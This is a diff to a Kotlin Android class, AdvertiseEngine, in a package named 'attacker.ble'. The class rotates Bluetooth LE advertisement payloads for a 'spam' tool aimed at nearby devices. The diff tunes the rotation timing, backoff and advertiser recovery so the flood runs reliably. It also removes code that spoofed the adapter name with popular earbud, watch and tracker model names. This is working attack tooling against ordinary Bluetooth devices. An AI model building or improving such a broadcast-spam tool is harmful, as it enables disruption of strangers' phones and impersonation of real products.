@@ -1,4 +1,4 @@
-﻿package com.komugi.attacker.ble
+package com.komugi.attacker.ble
 
 import android.Manifest
 import android.annotation.SuppressLint
@@ -10,6 +10,7 @@ import android.bluetooth.le.AdvertiseSettings
 import android.bluetooth.le.BluetoothLeAdvertiser
 import android.content.Context
 import android.content.pm.PackageManager
+import android.os.Build
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Job
@@ -20,23 +21,19 @@ import kotlinx.coroutines.launch
 import java.util.Locale
 
 /**
- * Rotates BLE advertisement payloads as fast as the controller accepts them.
- *
- * One advertise slot is used at a time: start, hold for the configured interval, stop,
- * repeat. Rotation order is reshuffled every pass so a receiver sees a scattered stream
- * of models instead of a fixed sequence.
+ * Rotates BLE advertisement payloads stably without exhausting or crashing the Bluetooth controller.
  */
 @SuppressLint("MissingPermission")
 class AdvertiseEngine(
     private val context: Context,
     private val config: SpamConfig,
     private val payloads: List<BlePayload>,
-    private val namePool: List<String>,
 ) {
 
     private var job: Job? = null
     private var advertiser: BluetoothLeAdvertiser? = null
     private var adapter: BluetoothAdapter? = null
+    private var isAdvertising = false
 
     private val settings: AdvertiseSettings = AdvertiseSettings.Builder()
         .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
@@ -45,15 +42,15 @@ class AdvertiseEngine(
         .setTimeout(0)
         .build()
 
-    private var lastError = -1
-
     private val callback = object : AdvertiseCallback() {
         override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
-            lastError = AdvertiseCallback.ADVERTISE_FAILED_ALREADY_STARTED + 100
+            isAdvertising = true
         }
 
         override fun onStartFailure(errorCode: Int) {
-            lastError = errorCode
+            isAdvertising = false
+            // 1: DATA_TOO_LARGE, 2: TOO_MANY_ADVERTISERS, 3: ALREADY_STARTED, 4: INTERNAL_ERROR, 5: FEATURE_UNSUPPORTED
+            SpamState.log("advertise: start failure code=$errorCode")
         }
     }
 
@@ -74,7 +71,7 @@ class AdvertiseEngine(
             SpamState.log("advertise: this controller has no LE advertiser")
             return
         }
-        randomizeAdapterName()
+        
         SpamState.log("advertise: engine up, ${payloads.size} payloads, ${config.effectiveInterval} ms")
         job = scope.launch { loop() }
     }
@@ -82,8 +79,15 @@ class AdvertiseEngine(
     fun stop() {
         job?.cancel()
         job = null
-        runCatching { advertiser?.stopAdvertising(callback) }
+        stopCurrentBurst()
         advertiser = null
+    }
+
+    private fun stopCurrentBurst() {
+        runCatching {
+            advertiser?.stopAdvertising(callback)
+        }
+        isAdvertising = false
     }
 
     private suspend fun loop() {
@@ -98,7 +102,7 @@ class AdvertiseEngine(
             val data = buildData(payload)
             if (data == null) {
                 SpamState.failure("too large")
-                delay(40)
+                delay(100)
                 continue
             }
             val started: Boolean = startBurst(data)
@@ -112,44 +116,44 @@ class AdvertiseEngine(
                         String.format(Locale.US, "advertise: %d bursts, payload %s", burst, payload.label)
                     )
                 }
-                delay(config.effectiveInterval)
+                delay(config.effectiveInterval.coerceAtLeast(150L))
             } else {
                 consecutiveFailures++
                 SpamState.failure(payload.label)
                 delay(backoffFor(consecutiveFailures))
-                if (consecutiveFailures % 25 == 0) {
+                if (consecutiveFailures % 10 == 0) {
                     recoverAdvertiser()
                 }
             }
         }
     }
 
-
     private suspend fun startBurst(data: AdvertiseData): Boolean {
         return try {
-            advertiser?.stopAdvertising(callback)
+            val adv = advertiser ?: return false
+            // Stop previous burst cleanly with settle delay so BT controller doesn't choke
+            runCatching { adv.stopAdvertising(callback) }
             delay(STOP_SETTLE_MS)
-            // The scan response overload returns void: success is "no exception thrown".
-            advertiser?.startAdvertising(settings, data, scanResponse(), callback)
+            adv.startAdvertising(settings, data, null, callback)
             true
         } catch (throwable: Throwable) {
-            SpamState.log("advertise: ${throwable.javaClass.simpleName} ${throwable.message.orEmpty()}")
+            SpamState.log("advertise error: ${throwable.javaClass.simpleName} ${throwable.message.orEmpty()}")
             false
         }
     }
 
     private fun backoffFor(failures: Int): Long = when {
-        failures < 5 -> 40L
-        failures < 20 -> 120L
-        else -> 400L
+        failures < 3 -> 150L
+        failures < 10 -> 350L
+        else -> 1000L
     }
 
     private fun recoverAdvertiser() {
         val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
-        val adapter = manager?.adapter ?: return
+        val ad = manager?.adapter ?: return
         runCatching { advertiser?.stopAdvertising(callback) }
-        advertiser = adapter.bluetoothLeAdvertiser
-        SpamState.log("advertise: advertiser rebind after repeated failures")
+        advertiser = ad.bluetoothLeAdvertiser
+        SpamState.log("advertise: advertiser rebind after failures")
     }
 
     private fun buildData(payload: BlePayload): AdvertiseData? {
@@ -162,19 +166,8 @@ class AdvertiseEngine(
         }.getOrNull()
     }
 
-    private fun scanResponse(): AdvertiseData? = runCatching {
-        AdvertiseData.Builder()
-            .setIncludeDeviceName(true)
-            .build()
-    }.getOrNull()
-
-    private fun randomizeAdapterName() {
-        if (namePool.isEmpty()) return
-        runCatching { adapter?.name = namePool.random() }
-    }
-
     private fun hasPermissions(): Boolean {
-        val required = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+        val required = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
             listOf(Manifest.permission.BLUETOOTH_ADVERTISE, Manifest.permission.BLUETOOTH_CONNECT)
         } else {
             listOf(Manifest.permission.BLUETOOTH_ADMIN)
@@ -185,21 +178,6 @@ class AdvertiseEngine(
     }
 
     companion object {
-        private const val STOP_SETTLE_MS = 12L
-
-        val NAME_POOL = listOf(
-            "AirPods Pro",
-            "AirPods Max",
-            "Galaxy Buds2 Pro",
-            "Galaxy Watch6",
-            "Sony WH-1000XM5",
-            "Bose QuietComfort",
-            "JBL Flip 6",
-            "Tile Mate",
-            "Surface Headphones",
-            "Beats Studio Pro",
-            "Pixel Buds Pro",
-            "Nothing Ear (2)",
-        )
+        private const val STOP_SETTLE_MS = 60L
     }
 }
